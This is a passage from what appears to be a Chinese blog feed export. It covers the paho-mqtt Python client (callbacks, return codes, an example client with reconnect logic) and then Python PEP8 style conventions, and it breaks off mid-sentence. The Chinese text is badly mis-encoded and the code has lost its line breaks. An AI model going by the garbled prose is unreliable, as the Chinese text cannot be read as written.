æ–­å¼€è¿žæŽ¥æ—¶å°½é‡ä»Žæ–°è¿žæŽ¥, é¿å…mqttç¦»çº¿åŽ, é‡æ–°ä¸Šçº¿, é€ æˆæœåŠ¡è¿žæŽ¥å¼‚å¸¸ã€‚(æ³¨æ„loopçš„è¿”å›ž, ä¿è¯loopç½‘ç»œäº‹ä»¶æŒç»­å¤„ç†ä¸­) çŽ¯å¢ƒä»‹ç»ä»‹ç»ä¸‹æˆ‘çš„æµ‹è¯•çŽ¯å¢ƒ: Python Version: 3.6 MQTT Server: emqttserver:2.2-rc1 MQTT Client: paho-mqtt: 1.3.0 emqtt serverå®‰è£…å‚è€ƒemqtt dockerå®‰è£…python mqttå®¢æˆ·ç«¯çš„å®‰è£…è¯·å‚è€ƒGithubåœ°å€ å®¢æˆ·ç«¯ä½¿ç”¨ä»‹ç»paho-mqttæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯ç±», æˆ‘ä»¬ä¸»è¦ä½¿ç”¨è¯¥ç±»æ¥å’Œmqttserverè¿›è¡Œäº¤äº’, é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨è¿™ä¸ªç±»å–ƒ: å»ºç«‹è¿žæŽ¥: ä½¿ç”¨connect()/connect_async()æ¥é“¾æŽ¥åˆ°broker(mqtt server) æ–­å¼€è¿žæŽ¥: ä½¿ç”¨disconnect()æ–¹æ³•æ¥æ–­å¼€å’Œbroker(mqtt server)ä¹‹é—´çš„ç½‘ç»œè¿žæŽ¥ã€‚ å¤„ç†ç½‘ç»œäº‹ä»¶: è¯·é¢‘ç¹è°ƒç”¨loop()æ¥ç»´æŒå’Œbroker(mqtt server)ä¹‹é—´çš„ç½‘ç»œäº‹ä»¶ã€‚å¦‚æžœä¸æƒ³è‡ªå·±é¢‘ç¹çš„è°ƒç”¨loopæ¥ç»´æŠ¤ç½‘ç»œäº‹ä»¶, å¯ä»¥ä½¿ç”¨loop_forever()æ–¹æ³•æ¥å¤„ç†,è¯¥æ–¹æ³•ä¼šå¸®ä½ å¾ªçŽ¯è°ƒç”¨loop, å› æ­¤è¯¥æ–¹æ³•æ˜¯ä¸€ä¸ªé˜»å¡žçš„æ–¹æ³•ã€‚å¦‚æžœä¸æƒ³åœ¨ç¨‹åºé‡Œé¢é˜»å¡ž,å¯ä»¥ä½¿ç”¨loop_start()æ–¹æ³•,è¯¥æ–¹æ³•ä¼šå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹åœ¨åŽå°æ‰§è¡Œloop_foreverã€‚ è®¢é˜…æ¶ˆæ¯: ä½¿ç”¨subscribe()æ–¹æ³•æ¥è®¢é˜…topicå’ŒæŽ¥æ”¶æ•°æ® å‘å¸ƒæ¶ˆæ¯: ä½¿ç”¨publish()æ–¹æ³•æ¥å‘å¸ƒæ¶ˆæ¯ mqttçš„é€šä¿¡æ˜¯å¼‚æ­¥çš„, é€šè¿‡ç½‘ç»œäº‹ä»¶æ¥è¿›è¡Œå›žè°ƒå¤„ç†, å› æ­¤æˆ‘ä»¬åŸºæœ¬é‡‡ç”¨å›žè°ƒæ¥ç¼–ç¨‹, å›žè°ƒå‡½æ•°çš„ç­¾åå¦‚ä¸‹, æ‰€æœ‰çš„å›žè°ƒå‡½æ•°éƒ½2ä¸ªå›ºå®šå‚æ•°: client: å›žè°ƒæ—¶ä¼ é€’æ¥çš„å®¢æˆ·ç«¯å®žä¾‹ userdata: userçš„ä»»ä½•ç±»åž‹çš„æ•°æ®, å®žä¾‹åŒ–clientæ—¶ä¼ å…¥, ç”¨æˆ·è‡ªå·±ä½¿ç”¨ã€‚ on_connect(client, userdata, flags, rc)å½“brokerå“åº”äº†æˆ‘ä»¬é“¾æŽ¥ä¹‹åŽè°ƒç”¨, æ¶‰åŠåˆ°çš„å‚æ•°: flags: æ˜¯ä¸€ä¸ªå­—å…¸, åŒ…å«brokerè¿”å›žçš„å“åº”æ ‡å¿—çŽ°åœ¨åªæœ‰1ä¸­æ ‡å¿—: session present, é€šè¿‡flags[â€˜session presentâ€™]èŽ·å–åˆ°è¯¥æ ‡å¿—é‡Œé¢çš„å†…å®¹, å½“clean sessionä¸º0æ—¶(clean_session=False), brokerä¼šä¿å­˜clientçš„çš„sessionä¿¡æ¯, è¯¥ä¿¡æ¯ä¼šåœ¨clienté‡æ–°ä¸Šçº¿æ—¶, é€šè¿‡session presentè¿™ä¸ªæ ‡å¿— è¿”å›žç»™å®¢æˆ·ç«¯ã€‚ rc: retrun code, è¿”å›žçŠ¶æ€ç  RC Status Description 0 successful connected 1 refused incorrect protocol version 2 refused invalid client identifier 3 refused server unavailable 4 refused bad username or password 5 refused not authorised 6-255 refused Currently unused on_disconnect(client, userdata, rc)å½“clientå’Œbrokeræ–­å¼€è¿žæŽ¥æ—¶è°ƒç”¨. rcè¡¨ç¤ºæ–­å¼€è¿žæŽ¥æ˜¯çš„çŠ¶æ€ RC Description 0 MQTT_ERR_SUCCESS, å®¢æˆ·ç«¯è°ƒç”¨disconnect()æ–¹æ³•æ–­å¼€è¿žæŽ¥, å±žäºŽæ­£å¸¸æ–­å¼€ 1 ç½‘ç»œç­‰å…¶ä»–åŽŸå› ç…§æˆçš„è¿žæŽ¥æ–­å¼€, å¼‚å¸¸æ–­å¼€ on_message(client, userdata, message)å½“å®¢æˆ·ç«¯è®¢é˜…çš„topicä¸Šæœ‰æ•°æ® è¢«æŽ¥æ”¶æ—¶è°ƒç”¨, messageæ˜¯ä¸€ä¸ªMQTTMessageçš„ç±», è¯¥ç±»åŒ…å«äº†messageçš„æ‰€æœ‰æ•°æ®: topic: æ•°æ®æ‰€åœ¨çš„topic payload: messageçš„æ•°æ®éƒ¨åˆ† qos: è¯¥æ¶ˆæ¯çš„è´¨é‡: 0, 1, 2 retain: è¯¥æ¶ˆæ¯æ˜¯å¦æ˜¯ä¿ç•™æ¶ˆæ¯, å¦‚æžœä¸ºTrue è¿™ä¸ºä¿ç•™æ¶ˆæ¯, å¦‚æžœä¸ºFalseå°±æ˜¯æœ€æ–°çš„æ¶ˆæ¯ã€‚ mid: message id on_publish(client, userdata, mid)å½“ä½¿ç”¨publishæ–¹æ³•å°†messageä¼ è¾“åˆ°brokeråŽè°ƒç”¨, ä½†æ˜¯è¿™è¦é’ˆå¯¹ä¸åŒçš„qos, å¯¹äºŽqos1å’Œ2è€Œè¨€, è¿™è¡¨ç¤ºæ¶ˆæ¯å·²ç»åˆ°è¾¾åŽçš„å›žè°ƒ, å¦‚æžœqosæ˜¯0é‚£ä¹ˆä»…ä»…è¡¨ç¤ºæ¶ˆæ¯ç¦»å¼€äº†å®¢æˆ·ç«¯ä¹‹åŽçš„å›žè°ƒã€‚è¿™ä¸ªå›žè°ƒå¾ˆé‡è¦ï¼Œå› ä¸ºå³ä½¿publish()è°ƒç”¨è¿”å›žæˆåŠŸï¼Œå¹¶ä¸æ€»æ˜¯æ„å‘³ç€å·²ç»å‘é€äº†æ¶ˆæ¯ mid: è¡¨ç¤ºå·²ç»publishå‡ºåŽ»çš„æ¶ˆæ¯çš„message id on_subscribe(client, userdata, mid, granted_qos)å½“brokerå“åº”äº†subscribeè¯·æ±‚ä¹‹åŽè°ƒç”¨ã€‚ mid: è¢«è®¢é˜…æ¶ˆæ¯çš„message id granted_qos: brokerä¸ºä¸åŒçš„è®¢é˜…è¯·æ±‚æŽˆæƒçš„qosçº§åˆ«ã€‚æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚ on_unsubscribe(client, userdata, mid)å½“brokerå“åº”äº†å–æ¶ˆè®¢é˜…çš„è¯·æ±‚è¿‡åŽè°ƒç”¨ã€‚ mid: å–æ¶ˆè®¢é˜…çš„æ¶ˆæ¯çš„message id on_log(client, userdata, level, buf)MQTTé€šä¿¡è¿‡ç¨‹ä¸­çš„ä¸€äº›Debugä¿¡æ¯ level: æ—¥å¿—çº§åˆ«MQTT_LOG_INFO, MQTT_LOG_NOTICE, MQTT_LOG_WARNING, MQTT_LOG_ERR, and MQTT_LOG_DEBUG buf: message buffer, debugä¿¡æ¯æœ¬èº«ã€‚ ç¤ºä¾‹ä»£ç æˆ‘Githubä¸Šæœ‰: å®Œæ•´ç¤ºä¾‹ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#!/usr/bin/env python3# -*- coding: utf8 -*-import threadingimport loggingimport timefrom paho.mqtt.client import ClientFORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'logging.basicConfig(format=FORMAT, level=logging.INFO)logger = logging.getLogger()def pub_topic_test01(client): while True: client.publish(topic="test01", qos=2, payload="test01 topic data") time.sleep(2)def pub_topic_test02(client): while True: client.publish(topic="test02", qos=2, payload="test02 topic data") time.sleep(2)class MyMQTTClass(Client): """ mqtt client for deal data """ def __init__(self): super(MyMQTTClass, self).__init__(client_id="test client", clean_session=False) def on_connect(self, client, obj, flags, rc): logger.info("on connect, rc: %s" % rc) # é“¾æŽ¥è¿‡åŽå…ˆå¤„ç†sub client.subscribe(topic="test01", qos=2) client.subscribe(topic="test02", qos=2) logger.info("start topic service1...") t1 = threading.Thread(target=pub_topic_test01, args=(client,)) t1.start() self.worker1 = t1 logger.info("start topic service2...") t2 = threading.Thread(target=pub_topic_test02, args=(client,)) t2.start() self.worker2 = t2 def on_message(self, client, obj, msg): logger.debug("on message, topic: %s, qos: %s, data: %s" % (msg.topic, msg.qos, msg.payload)) if msg.topic == "test01": logger.info("deal test01, data: %s" % msg.payload) elif msg.topic == "test02": logger.info("deal test02, data: %s" % msg.payload) else: logger.info("other topic %s, data: %s" %(msg.topic, msg.payload)) def on_publish(self, client, obj, mid): logger.debug("publish -&gt; ,mid: %s" % mid) def on_subscribe(self, client, obj, mid, granted_qos): logger.debug("subscribed &lt;- ,mid: %s, qos: %s" %(mid, granted_qos)) def on_log(self, mqttc, obj, level, string): logger.debug("mqtt debug: %s" % string) def on_disconnect(self, client, userdata, rc): logger.info("disconnect: %s" % rc) while rc == 1: try: client.reconnect() logger.info("reconnect success") rc = 0 except Exception as e: logger.error("reconnect error, %s retry after 3s" % e) time.sleep(3) def run(self): self.connect("172.16.112.251", 1883, 60) while True: rc = self.loop() if rc != 0: time.sleep(1) rc = self.loop() logger.info("recovery from error loop, %s" % rc)def main(): client = MyMQTTClass() client.run()if __name__ == "__main__": main()]]></content>
      <tags>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonç¼–ç é£Žæ ¼]]></title>
    <url>%2F2017%2F06%2F24%2Fpython-style-pep8%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åšé¡¹ç›®ä¸€ç›´ä½¿ç”¨Golang, è·ç¦»ä¸Šæ¬¡ä½¿ç”¨Pythonå·²ç»åŠå¹´ä¹‹ä¹…äº†, å¯¹äºŽGoæ¥è¯´æœ‰fmtå¸®å¿™æ ¼å¼åŒ–, è§£å†³äº†ç»å¤§éƒ¨åˆ†ç¼–ç é£Žæ ¼é—®é¢˜, è€ŒPythonåˆ™éœ€è¦è‡ªå·±æ³¨æ„,æ ¹æ®å®˜æ–¹æŒ‡å¯¼PEP8æˆ–è€…ä¸€äº›æœ€ä½³å®žè·µæ¯”å¦‚Google Styleæ¥æŽ§åˆ¶é£Žæ ¼ã€‚æ—¶é—´ä¹…äº† ä¸€äº›ç»†èŠ‚éƒ¨åˆ†å°±å¿˜è®°äº†, äºŽæ˜¯ç¿»é˜…ä¹‹å‰å†™çš„åšå®¢, å—ç›Šè‰¯å¤š, äºŽæ˜¯æ‰“ç®—æŠŠä¹‹å‰çš„è¿™å‡ ç¯‡åšå®¢è¿ç§»è¿‡æ¥, é¡ºä¾¿æ›´æ–°, æ–¹ä¾¿ä»¥åŽæŸ¥é˜…ã€‚ å…³äºŽæœ¬æ–‡æœ¬æ–‡ä¸»è¦å‚è€ƒPEP8(Pythonç‰ˆæœ¬æ ‡å‡†åº“çš„ç¼–ç çº¦å®š),ä»¥åŠGoogle Styleç¼–ç é£Žæ ¼, ä½†å´ä¸ä¼šå®Œå…¨æŒ‰ç…§PEP8è¿›è¡Œç¿»è¯‘, æˆ‘ä¸ä¼šè´´å‡ºä¸åˆè§„èŒƒçš„ä»£ç , å°½é‡ç®€æ´æ˜“æ‡‚, æ–¹ä¾¿å¿«é€Ÿé˜…è¯», å¦‚æžœæƒ³çœ‹å®Œæ•´ç‰ˆæœ¬çš„PEP8ç›¸å…³æ–‡æ¡£, è¯·ç§»æ­¥å‚è€ƒæ–‡æ¡£éƒ¨åˆ†ã€‚ é£Žæ ¼æŒ‡å—çš„ç›®çš„é£Žæ ¼æŒ‡å—çš„ç›®çš„åœ¨äºŽç»Ÿä¸€ç¼–ç é£Žæ ¼,è®©ä»£ç æœ‰è§„å¯å¾ª,è¿™æ ·äººä»¬å°±å¯ä»¥ä¸“æ³¨äºŽâ€ä½ åœ¨è¯´ä»€ä¹ˆâ€, è€Œä¸æ˜¯â€ä½ åœ¨æ€Žä¹ˆè¯´â€.ä»Žè€Œæ”¹å–„Pythonä»£ç çš„å¯è¯»æ€§,å³PEP 20æ‰€è¯´çš„â€œå¯è¯»æ€§è®¡æ•°â€(Readability counts). é£Žæ ¼æŒ‡é’ˆåœ¨äºŽç»Ÿä¸€é£Žæ ¼, PEP8ä»…ä»…æ˜¯å®˜æ–¹æŒ‡å¯¼, æœ¬åœ°ç¼–ç é£Žæ ¼åŒæ ·é‡è¦, å¦‚æžœæ»¡è¶³å¯è¯»æ€§, ä¼˜å…ˆä¿æŒæœ¬åœ°é£Žæ ¼, ä½¿å¾—ä½ æ•´ä½“é¡¹ç›®çš„ä»£ç é£Žæ ¼ä¸€è‡´ã€‚ ä»£ç å¸ƒå±€ æ¯çº§ç¼©è¿›ç”¨4ä¸ªç©ºæ ¼(å¼ºçƒˆå»ºè®®ä½¿ç”¨4ä¸ªç©ºæ ¼ä½œä¸ºç¼©è¿›), ä¸è¦æ··ç”¨ç©ºæ ¼å’ŒTab, Python3ä¸­ä¸å…è®¸æ··åˆä½¿ç”¨Tabå’Œç©ºæ ¼ç¼©è¿› 123def get_version(version=None): "Returns a PEP 386-compliant version number from VERSION." version = get_complete_version(version) æ‹¬å·ä¸­ä½¿ç”¨åž‚ç›´éšå¼ç¼©è¿›æˆ–ä½¿ç”¨æ‚¬æŒ‚ç¼©è¿›ï¼ˆå¯¹å‡†å·¦æ‹¬å·ï¼‰ 12foo = long_function_name(var_one, var_two, var_three, var_four) ifè¯­å¥è·¨è¡Œæ—¶ï¼Œä¸¤ä¸ªå­—ç¬¦å…³é”®å­—(æ¯”å¦‚if)åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ï¼Œå†åŠ ä¸Šå·¦æ‹¬å·æž„æˆäº†å¾ˆå¥½çš„ç¼©è¿›ã€‚ 1234# Add some extra indentation on the conditional continuation line.if (this_is_one_thing and that_is_another_thing): do_something() å³è¾¹æ‹¬å·ä¹Ÿå¯ä»¥å¦èµ·ä¸€è¡Œï¼ˆå³æ‹¬å·å›žé€€ï¼‰ 12345678my_list = [ 1, 2, 3, 4, 5, 6,]result = some_function_that_takes_arguments( 'a', 'b', 'c', 'd', 'e', 'f',) æœ€å¤§è¡Œå®½é™åˆ¶æ‰€æœ‰è¡Œçš„æœ€å¤§è¡Œå®½ä¸º79å­—ç¬¦ã€‚æ–‡æœ¬é•¿å—ï¼Œæ¯”å¦‚æ–‡æ¡£å­—ç¬¦ä¸²æˆ–æ³¨é‡Šï¼Œè¡Œé•¿åº¦åº”é™åˆ¶ä¸º72ä¸ªå­—ç¬¦ã€‚ç»­è¡Œçš„é¦–é€‰æ–¹æ³•æ˜¯ä½¿ç”¨å°æ‹¬å·ã€ä¸­æ‹¬å·å’Œå¤§æ‹¬å·åæ–œçº¿ä»å¯èƒ½åœ¨é€‚å½“çš„æ—¶å€™ã€‚å…¶æ¬¡æ˜¯åæ–œæ ã€‚123with open('/path/to/some/file/you/want/to/read') as file_1, \ open('/path/to/some/file/being/written', 'w') as file_2: file_2.write(file_1.read()) ç©ºè¡Œ ç©ºäºŒè¡Œ: é¡¶çº§å®šä¹‰ä¹‹é—´ç©ºä¸¤è¡Œ, æ¯”å¦‚å‡½æ•°æˆ–è€…ç±»å®šä¹‰. ç©ºä¸€è¡Œ: æ–¹æ³•å®šä¹‰, ç±»å®šä¹‰ä¸Žç¬¬ä¸€ä¸ªæ–¹æ³•ä¹‹é—´, éƒ½åº”è¯¥ç©ºä¸€è¡Œ. å‡½æ•°æˆ–æ–¹æ³•ä¸­, æŸäº›åœ°æ–¹è¦æ˜¯ä½ è§‰å¾—åˆé€‚, å°±ç©ºä¸€è¡Œ.12345678910111213141516171819202122232425class StreamingHttpResponse(HttpResponseBase): """ A streaming HTTP response class with an iterator as content. This should only be iterated once, when the response is streamed to the client. However, it can be appended to or replaced with a new iterator that wraps the original content (or yields entirely new content). """ streaming = True def __init__(self, streaming_content=(), *args, **kwargs): super(StreamingHttpResponse, self).__init__(*args, **kwargs) # `streaming_content` should be an iterable of bytestrings. # See the `streaming_content` property methods. self.streaming_content = streaming_content @property def content(self): raise AttributeError("This %s instance has no `content` attribute. " "Use `streaming_content` instead." % self.__class__.__name__) @property def streaming_content(self): return map(self.make_bytes, self._iterator) æ¨¡å—å¯¼å…¥ å¯¼å…¥åœ¨å•ç‹¬æˆè¡Œ, åŒä¸€ä¸ªæ¨¡å—çš„å¤šä¸ªå¯¹è±¡è¢«å¯¼å‡ºæ—¶ä½¿ç”¨() å¯¼å…¥å§‹ç»ˆåœ¨æ–‡ä»¶çš„é¡¶éƒ¨ï¼Œåœ¨æ¨¡å—æ³¨é‡Šå’Œæ–‡æ¡£å­—ç¬¦ä¸²ä¹‹åŽï¼Œåœ¨æ¨¡å—å…¨å±€å˜é‡å’Œå¸¸é‡ä¹‹å‰ã€‚ æŽ¨èç»å¯¹è·¯å¾„å¯¼å…¥ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸æ›´å¯è¯»ï¼Œè€Œä¸”å¾€å¾€æ˜¯è¡¨çŽ°æ›´å¥½çš„ï¼ˆæˆ–è‡³å°‘æä¾›æ›´å¥½çš„é”™è¯¯æ¶ˆæ¯ã€‚ ç¦æ­¢ä½¿ç”¨é€šé…ç¬¦å¯¼å…¥ã€‚ å¯¼å…¥é¡ºåºå¦‚ä¸‹ï¼šæ ‡å‡†åº“è¿›å£,ç›¸å…³çš„ç¬¬ä¸‰æ–¹åº“ï¼Œæœ¬åœ°åº“ã€‚å„ç»„çš„å¯¼å…¥ä¹‹é—´è¦æœ‰ç©ºè¡Œã€‚123456789101112131415161718192021222324252627282930313233# æ ‡å‡†åº“import asyncioimport osimport tracebackfrom functools import partialfrom inspect import isawaitablefrom multiprocessing import Processfrom signal import ( SIGTERM, SIGINT, signal as signal_func, Signals)from socket import ( socket, SOL_SOCKET, SO_REUSEADDR,)from time import time# ç¬¬ä¸‰æ–¹åº“from httptools import HttpRequestParserfrom httptools.parser.errors import HttpParserErrortry: import uvloop as async_loopexcept ImportError: async_loop = asyncio# æœ¬åœ°åº“from sanic.log import log, netlogfrom sanic.response import HTTPResponsefrom sanic.request import Requestfrom sanic.exceptions import ( RequestTimeout, PayloadTooLarge, InvalidUsage, ServerError) å­—ç¬¦ä¸²å¼•ç”¨Pythonä¸­å•å¼•å·å­—ç¬¦ä¸²å’ŒåŒå¼•å·å­—ç¬¦ä¸²éƒ½æ˜¯ç›¸åŒçš„ã€‚æ³¨æ„å°½é‡é¿å…åœ¨å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ä»¥æé«˜å¯è¯»æ€§ã€‚æ¯”å¦‚ä¸€æ®µå­—ç¬¦ä¸²é‡Œé¢æ—¢æœ‰å•å¼•å·ï¼Œåˆæœ‰åŒå¼•å·ï¼Œå°±çš„ä½¿ç”¨ å¤šè¡Œå­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œé¿å…ä½¿ç”¨ \â€ æˆ–\â€™1error = """My Class hasn't "test" attribute.""" è¡¨è¾¾å¼å’Œè¯­å¥ä¸­çš„ç©ºæ ¼12345678910111213141516171819202122# æ‹¬å·é‡Œè¾¹é¿å…ç©ºæ ¼ spam(ham[1], &#123;eggs: 2&#125;)# é€—å·ï¼Œå†’å·ï¼Œåˆ†å·ä¹‹å‰é¿å…ç©ºæ ¼if x == 4: print x, y; x, y = y, x# ç´¢å¼•æ“ä½œç¬¦ä¸ç•™ç©ºæ ¼ham[1:9:3]# å‡½æ•°è°ƒç”¨çš„å·¦æ‹¬å·ä¹‹å‰ä¸èƒ½æœ‰ç©ºæ ¼spam(1)# äºŒå…ƒæ“ä½œç¬¦ä¸¤è¾¹ç•™ä¸€ä¸ªç©ºæ ¼,æ¶‰åŠ =ã€ç¬¦åˆæ“ä½œç¬¦ ( += , -=ç­‰)ã€æ¯”è¾ƒ( == , &lt; , &gt; , != , &lt;&gt; , &lt;= , &gt;= , in , not in , is , is not )ã€å¸ƒå°”( and , or , not )x = 1# æžä¼˜å…ˆçº§è¿ç®—ç¬¦å‰åŽä¸ç•™ç©ºæ ¼hypot2 = x*x + y*yc = (a+b) * (a-b)# å…³é”®å­—å‚æ•°å’Œé»˜è®¤å€¼å‚æ•°çš„å‰åŽä¸è¦åŠ ç©ºæ ¼def complex(real, imag=0.0): return magic(r=real, i=imag)# å‡½æ•°æ³¨é‡Šä¸­ï¼Œ=å‰åŽè¦æœ‰ç©ºæ ¼ï¼Œå†’å·å’Œ"-&gt;"çš„å‰é¢æ— ç©ºæ ¼ï¼ŒåŽé¢æœ‰ç©ºæ ¼ã€‚def munge(sep: AnyStr = None):def munge() -&gt; AnyStr:# å°½é‡ä¸ä½¿ç”¨å¤åˆè¯­å¥(Compound statements: å¤šæ¡è¯­å¥å†™åœ¨åŒä¸€è¡Œ)if foo == 'blah': do_blah_thing() æ™®é€šæ³¨é‡Šé€šç”¨è§„åˆ™: ä¸Žä»£ç è‡ªç›¸çŸ›ç›¾çš„æ³¨é‡Šæ¯”æ²¡æ³¨é‡Šæ›´å·®ã€‚ä¿®æ”¹ä»£ç æ—¶è¦ä¼˜å…ˆæ›´æ–°æ³¨é‡Šï¼ æ³¨é‡Šæ˜¯å®Œæ•´çš„å¥å­ã€‚å¦‚æžœæ³¨é‡Šæ˜¯æ–­å¥ï¼Œé¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œé™¤éžå®ƒæ˜¯å°å†™å­—æ¯å¼€å¤´çš„æ ‡è¯†ç¬¦(æ°¸è¿œä¸è¦ä¿®æ”¹æ ‡è¯†ç¬¦çš„å¤§å°å†™)ã€‚ å¦‚æžœæ³¨é‡Šå¾ˆçŸ­ï¼Œå¯ä»¥çœç•¥æœ«å°¾çš„å¥å·ã€‚æ³¨é‡Šå—é€šå¸¸ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ®µè½ç»„æˆã€‚æ®µè½ç”±å®Œæ•´çš„å¥å­æž„æˆä¸”æ¯ä¸ªå¥å­åº”è¯¥ä»¥ç‚¹å·(åŽé¢è¦æœ‰ä¸¤ä¸ªç©ºæ ¼)ç»“æŸï¼Œå¹¶æ³¨æ„æ–­è¯å’Œç©ºæ ¼ã€‚ éžè‹±è¯­å›½å®¶çš„ç¨‹åºå‘˜è¯·ç”¨è‹±è¯­ä¹¦å†™ä½ çš„æ³¨é‡Šï¼Œé™¤éžä½ 200%ç¡®ä¿¡ä»£ç æ°¸è¿œä¸ä¼šè¢«ä¸æ‡‚ä½ çš„è¯­è¨€çš„äººé˜…è¯»ã€‚ æ³¨é‡Šå—: æ³¨é‡Šå—é€šå¸¸åº”ç”¨åœ¨ä»£ç å‰ï¼Œå¹¶å’Œè¿™äº›ä»£ç æœ‰åŒæ ·çš„ç¼©è¿›ã€‚æ¯è¡Œä»¥ â€˜# â€˜(é™¤éžå®ƒæ˜¯æ³¨é‡Šå†…çš„ç¼©è¿›æ–‡æœ¬ï¼Œæ³¨æ„#åŽé¢æœ‰ç©ºæ ¼)ã€‚ æ³¨é‡Šå—å†…çš„æ®µè½ç”¨ä»…åŒ…å«å•ä¸ª â€˜#â€™ çš„è¡Œåˆ†å‰²ã€‚ è¡Œå†…æ³¨é‡Š: æ…Žç”¨è¡Œå†…æ³¨é‡Š(Inline Comments) èŠ‚ä¿­ä½¿ç”¨è¡Œå†…æ³¨é‡Šã€‚ è¡Œå†…æ³¨é‡Šæ˜¯å’Œè¯­å¥åœ¨åŒä¸€è¡Œï¼Œè‡³å°‘ç”¨ä¸¤ä¸ªç©ºæ ¼å’Œè¯­å¥åˆ†å¼€ã€‚è¡Œå†…æ³¨é‡Šä¸æ˜¯å¿…éœ€çš„ï¼Œé‡å¤ç½—å—¦ä¼šä½¿äººåˆ†å¿ƒã€‚ 123456# We use a weighted dictionary search to find out where i is in# the array. We extrapolate position based on the largest num# in the array and the array size and then do binary search to# get the exact number.if i &amp; (i-1) == 0: # true iff i is a power of 2 æ–‡æ¡£æ³¨é‡Šè¿™éƒ¨åˆ†å¾ˆé‡è¦, ä»–æ˜¯Pythonç‹¬æœ‰çš„, ä¸ºæ‰€æœ‰å…¬å…±æ¨¡å—ã€å‡½æ•°ã€ç±»å’Œæ–¹æ³•ä¹¦å†™æ–‡æ¡£å­—ç¬¦ä¸²ã€‚éžå…¬å¼€æ–¹æ³•ä¸ä¸€å®šæœ‰æ–‡æ¡£å­—ç¬¦ä¸²ï¼Œå»ºè®®æœ‰æ³¨é‡Š(å‡ºçŽ°åœ¨defè¡Œä¹‹åŽ)æ¥æè¿°è¿™ä¸ªæ–¹æ³•åšä»€ä¹ˆ, è¯¦æƒ…å‚è€ƒPEP 257 æ–‡æ¡£å­—ç¬¦ä¸²çº¦å®š, ä½†æ˜¯è¿™éƒ¨åˆ†æˆ‘æ¯”è¾ƒæŽ¨å´‡Google Styleé£Žæ ¼ã€‚ æ–‡æ¡£å­—ç¬¦ä¸²ä»€ä¹ˆæ˜¯æ–‡æ¡£å­—ç¬¦ä¸²(Document String):æ–‡æ¡£å­—ç¬¦ä¸²æ˜¯åŒ…, æ¨¡å—, ç±»æˆ–å‡½æ•°é‡Œçš„ç¬¬ä¸€ä¸ªè¯­å¥. è¿™äº›å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡å¯¹è±¡çš„__doc__æˆå‘˜è¢«è‡ªåŠ¨æå–, å¹¶ä¸”è¢«pydocæ‰€ç”¨. æ–‡æ¡£å­—ç¬¦ä¸²çš„æ ¼å¼:é¦–å…ˆæ˜¯ä¸€è¡Œä»¥å¥å·, é—®å·æˆ–æƒŠå¹å·ç»“å°¾çš„æ¦‚è¿°(æˆ–è€…è¯¥æ–‡æ¡£å­—ç¬¦ä¸²å•çº¯åªæœ‰ä¸€è¡Œ). æŽ¥ç€æ˜¯ä¸€ä¸ªç©ºè¡Œ. æŽ¥ç€æ˜¯æ–‡æ¡£å­—ç¬¦ä¸²å‰©ä¸‹çš„éƒ¨åˆ†,å®ƒåº”è¯¥ä¸Žæ–‡æ¡£å­—ç¬¦ä¸²çš„ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå¼•å·å¯¹é½. ä¸‹é¢æœ‰æ›´å¤šæ–‡æ¡£å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–è§„èŒƒ. æ¨¡å—æ–‡æ¡£æ¨¡å—è¯´æ˜Ž: å¯¹è¿™ä¸ªæ¨¡å—è¿›è¡Œæ¦‚è²Œæ€§çš„æè¿°, æ¯”å¦‚Jsonåº“çš„è¯´æ˜Ž1234567891011121314151617181920212223242526r"""JSON (JavaScript Object Notation) &lt;http://json.org&gt; is a subset ofJavaScript syntax (ECMA-262 3rd edition) used as a lightweight datainterchange format.:mod:`json` exposes an API familiar to users of the standard library:mod:`marshal` and :mod:`pickle` modules. It is the externally maintainedversion of the :mod:`json` library contained in Python 2.6, but maintainscompatibility with Python 2.4 and Python 2.5 and (currently) hassignificant performance advantages, even without using the optional Cextension for speedups.Compact encoding:: &gt;&gt;&gt; import json &gt;&gt;&gt; json.dumps([1,2,3,&#123;'4': 5, '6': 7&#125;], sort_keys=True, separators=(',',':')) '[1,2,3,&#123;"4":5,"6":7&#125;]'Using json.tool from the shell to validate and pretty-print:: $ echo '&#123;"json":"obj"&#125;' | python -m json.tool &#123; "json": "obj" &#125; $ echo '&#123; 1.2:3.4&#125;' | python -m json.tool Expecting property name enclosed in double quotes: line 1 column 3 (char 2)""" å‡½æ•°å’Œæ–¹æ³•æ–‡æ¡£è¿™é‡Œè¯´çš„å‡½æ•°,åŒ…æ‹¬å‡½æ•°, æ–¹æ³•, ä»¥åŠç”Ÿæˆå™¨ã€‚ ä¸€ä¸ªå‡½æ•°å¿…é¡»è¦æœ‰æ–‡æ¡£å­—ç¬¦ä¸², é™¤éžå®ƒæ»¡è¶³ä»¥ä¸‹æ¡ä»¶: å¤–éƒ¨ä¸å¯è§ éžå¸¸çŸ­å° ç®€å•æ˜Žäº† æ–‡æ¡£å­—ç¬¦ä¸²åº”è¯¥æä¾›è¶³å¤Ÿçš„ä¿¡æ¯, å½“åˆ«äººç¼–å†™ä»£ç è°ƒç”¨è¯¥å‡½æ•°æ—¶, ä»–ä¸éœ€è¦çœ‹ä¸€è¡Œä»£ç , åªè¦çœ‹æ–‡æ¡£å­—ç¬¦ä¸²å°±å¯ä»¥äº†.å› æ­¤éœ€è¦æè¿°æ¸…æ¥šä»¥ä¸‹å‡ ç‚¹: å‡½æ•°å‚æ•°: Argsåˆ—å‡ºæ¯ä¸ªå‚æ•°çš„åå­—, å¹¶åœ¨åå­—åŽä½¿ç”¨ä¸€ä¸ªå†’å·å’Œä¸€ä¸ªç©ºæ ¼, 